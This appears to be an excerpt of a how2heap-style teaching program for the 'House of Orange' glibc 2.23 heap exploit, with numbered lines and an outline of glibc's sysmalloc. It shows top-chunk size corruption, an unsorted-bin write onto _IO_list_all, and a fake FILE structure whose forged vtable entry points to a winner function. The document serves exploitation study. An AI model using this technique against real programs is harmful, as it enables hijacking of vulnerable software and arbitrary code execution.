@@ -1,0 +1,53 @@
+37  char *p1, *p2;
+38  size_t io_list_all, *top;
+
+50  p1 = malloc(0x400-16);
+
+75  top = (size_t *) ( (char *) p1 + 0x400 - 16);
+76  top[1] = 0xc01;
+
+122 p2 = malloc(0x1000);
+158 io_list_all = top[2] + 0x9a8;
+175 top[3] = io_list_all - 0x10;
+182 memcpy( ( char *) top, "/bin/sh\x00", 8);
+214 top[1] = 0x61;
+
+225 FILE *fp = (FILE *) top;
+232 fp->_mode = 0;
+239 fp->_IO_write_base = (char *) 2;
+240 fp->_IO_write_ptr = (char *) 3;
+251 size_t *jump_table = &top[12];
+252 jump_table[3] = (size_t) &winner;
+253 *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table;
+
+257 malloc(10);
+
+
+
+
+// glibc-2.23/malloc/malloc.c
+2268 sysmalloc()
+2401     if (av != &main_arena)
+             ....
+2452     else
+2485         brk = (char *) (MORECORE (size));
+2537         if (brk != (char *) (MORECORE_FAILURE))
+2547             if (brk == old_end && snd_brk == (char *) (MORECORE_FAILURE))
+                     ....
+2550             else if (contiguous (av) && old_size && brk < old_end)
+                     ....
+2576             else
+2584                 if (contiguous (av))
+2619                     snd_brk = (char *) (MORECORE (correction));
+2646                 else
+                         ....
+2676                 if (snd_brk != (char *) (MORECORE_FAILURE))
+2691                     if (old_size != 0)
+2716                         _int_free (av, old_top, 1);
+
+
+
+
+
+
+
